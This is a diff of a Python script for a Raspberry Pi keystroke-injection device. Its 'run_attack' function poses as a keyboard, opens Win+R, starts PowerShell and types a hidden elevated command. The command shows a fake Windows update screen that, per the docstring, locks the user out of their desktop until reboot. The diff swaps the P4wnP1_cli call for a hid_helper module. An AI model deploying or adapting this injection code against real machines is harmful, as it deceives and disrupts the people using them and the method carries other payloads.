@@ -10,7 +10,6 @@ locking the user out of their desktop until they reboot.
 """
 
 import os, sys, subprocess, time
-sys.path.append(os.path.abspath(os.path.join(__file__, '..', '..')))
 import RPi.GPIO as GPIO
 import LCD_1in44, LCD_Config
 from PIL import Image, ImageDraw, ImageFont
@@ -32,29 +31,23 @@ def show_message(lines, color="lime"):
 def run_attack():
     show_message(["HID Attack:", "Fake Update"])
     
-    if subprocess.run("which P4wnP1_cli", shell=True, capture_output=True).returncode != 0:
-        show_message(["ERROR:", "P4wnP1_cli", "not found!"])
+    if not hid_helper.is_hid_gadget_enabled:
+        show_message(["ERROR:", "HID Gadget NOT", "enabled!"], "red")
+        time.sleep(3)
         return
 
     # PowerShell command to create a fake update screen
     ps_command = "powershell -WindowStyle Hidden -command \\"Start-Process powershell -ArgumentList '-NoExit -Command Write-Host \\'Installing critical updates, do not turn off your computer...\\'; for($i=0; $i -le 100; $i++) { Write-Progress -Activity \\'Configuring Windows Updates\\' -Status \\"$i% Complete\\" -PercentComplete $i; Start-Sleep -Milliseconds 300; }' -Verb RunAs\\""
     
-    script = f"""
-GUI r
-delay(500)
-type("powershell")
-delay(200)
-press("ENTER")
-delay(750)
-type("{ps_command}")
-delay(200)
-press("ENTER")
-"""
-    
-    cli_command = f"P4wnP1_cli hid job -c '{script}'"
-    
     try:
-        subprocess.run(cli_command, shell=True, check=True, timeout=30)
+        hid_helper.press_modifier_key(hid_helper.keyboard.left_gui, hid_helper.keyboard.r) # Win+R
+        time.sleep(0.5)
+        hid_helper.type_string("powershell")
+        hid_helper.press_key(hid_helper.keyboard.enter)
+        time.sleep(0.75)
+        hid_helper.type_string(ps_command)
+        hid_helper.press_key(hid_helper.keyboard.enter)
+        
         show_message(["Attack Sent!"])
     except Exception as e:
         show_message(["Attack FAILED!"])
